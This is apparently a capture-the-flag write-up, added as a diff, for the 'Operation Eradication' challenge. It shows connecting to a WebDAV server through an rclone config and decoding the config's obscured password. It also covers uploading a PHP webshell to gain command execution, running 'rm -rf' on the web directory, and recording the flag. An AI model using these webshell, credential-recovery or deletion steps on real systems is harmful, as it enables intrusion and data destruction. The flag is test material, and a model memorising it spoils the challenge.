@@ -1,0 +1,113 @@
+Challenge: Operation Eradication
+Category: Miscellaneous
+Difficulty: medium
+Author: @JohnHammond#6971
+
+Description: Oh no! A ransomware operator encrypted an environment, and exfiltrated data that they will soon use for blackmail and extortion if they don't receive payment! They stole our data!
+
+Luckily, we found what looks like a configuration file, that seems to have credentials to the actor's storage server... but it doesn't seem to work. Can you get onto their server and delete all the data they stole!?
+
+Download the file(s) below and press the Start button on the top-right to begin this challenge.
+Attachments: operation_eradication
+
+Solution:
+
+1. Determine file type for operation_eradication
+	a.  ┌──(kali㉿kali)-[~/CTF/huntress2023/misc/operation_eradication]
+		└─$ file operation_eradication 
+		operation_eradication: ASCII text
+
+2. View file contents of operation_eradication
+	a.  ┌──(kali㉿kali)-[~/CTF/huntress2023/misc/operation_eradication]
+		└─$ cat operation_eradication
+		type = webdav
+		url = http://localhost/webdav
+		vendor = other
+		user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
+		pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
+
+3. Search "type = webdav" vendor = other" in Google, found this to be an rClone config
+	a. https://rclone.org/webdav/
+
+4. Add contents of file to rclone config
+	a.  ┌──(kali㉿kali)-[~/CTF/huntress2023/misc/operation_eradication]
+		└─$ cat /home/kali/.config/rclone/rclone.conf 
+		[remote-new]
+		type = webdav
+		url = http://chal.ctf.games:30145/webdav
+		vendor = other
+		user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
+		pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
+
+5. Verify you can connect to the server (output truncated)
+	a.  ┌──(kali㉿kali)-[~/CTF/huntress2023/misc/operation_eradication]
+		└─$ rclone ls remote-new:
+		  1745724 ProductDevelopment/2022/ProductRoadmap.pdf
+		  3570194 ProductDevelopment/2023/ProductRoadmap.pdf
+		  3279252 ProductDevelopment/Designs/NewProductDesign.pdf
+		  3210830 ProductDevelopment/Designs/UpdatedProductDesign.pdf
+		   685745 ProductDevelopment/Reviews/NewProductReviewSummary.pdf
+		  2598294 ProductDevelopment/Reviews/UpdatedProductReviewSummary.pdf
+		  7680849 ProductDevelopment/Specifications/NewProductSpecs.pdf
+		  3891213 ProductDevelopment/Specifications/UpdatedProductSpecs.pdf
+		  1573530 Operations/Manuals/EquipmentManual.pdf
+		  3129867 Operations/Manuals/SafetyManual.pdf
+		  2688929 Legal/Policies/PrivacyPolicy.pdf
+		  7282838 Legal/Policies/TermsOfService.pdf
+		  {...}
+
+6. Attempt to delete contents of server with "rclone purge" (output truncated)
+	a. 	┌──(kali㉿kali)-[~/CTF/huntress2023/misc/operation_eradication]
+		└─$ rclone purge remote-new:
+		2023/10/23 17:28:06 ERROR : Attempt 1/3 failed with 1 errors and: rmdir failed: <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+		<html><head>
+		<title>403 Forbidden</title>
+		</head><body>
+		<h1>Forbidden</h1>
+		<p>You don't have permission to access this resource.</p>
+		<hr>
+		<address>Apache/2.4.54 (Debian) Server at chal.ctf.games Port 32577</address>
+
+7. Try to upload a webshell to elevate our access
+	a. https://github.com/WhiteWinterWolf/wwwolf-php-webshell
+	b.  ┌──(kali㉿kali)-[~/CTF/huntress2023/misc/operation_eradication]
+		└─$ rclone copy shell.php remote-new:/
+
+8. Verify that the shell copied (output truncated)
+	a.  ┌──(kali㉿kali)-[~/CTF/huntress2023/misc/operation_eradication]
+		└─$ rclone ls remote-new:             
+		     8266 shell.php
+		  1745724 ProductDevelopment/2022/ProductRoadmap.pdf
+		  3279252 ProductDevelopment/Designs/NewProductDesign.pdf
+		  3210830 ProductDevelopment/Designs/UpdatedProductDesign.pdf
+		  {...}
+
+9. Access the shell, if we need a username and password, decode it from the rclone password file
+	a. https://forum.rclone.org/t/how-to-retrieve-a-crypt-password-from-a-config-file/20051
+	b. https://go.dev/play/p/IcRYDip3PnE
+		i. Replce line 70's default value with: HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
+		ii. Received output: SuperExtremelySecurePasswordLikeAlways
+	c. http://chal.ctf.games:32577/webdav/shell.php
+	d. username: VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
+	e. password: SuperExtremelySecurePasswordLikeAlways
+
+10. Try running an "ls" command 
+	a. ls
+		Accounting
+		Finance
+		HumanResources
+		IT
+		Legal
+		Marketing
+		Operations
+		ProductDevelopment
+		Sales
+		shell.php
+
+11. Delete all directories
+	a. rm -rf /var/www/html/webdav/*
+
+12. Refresh challenge page: http://chal.ctf.games:32577/
+	a. Flag: flag{564607375b731174f2c08c5bf16e82b4}
+
+13. Flag: flag{564607375b731174f2c08c5bf16e82b4}
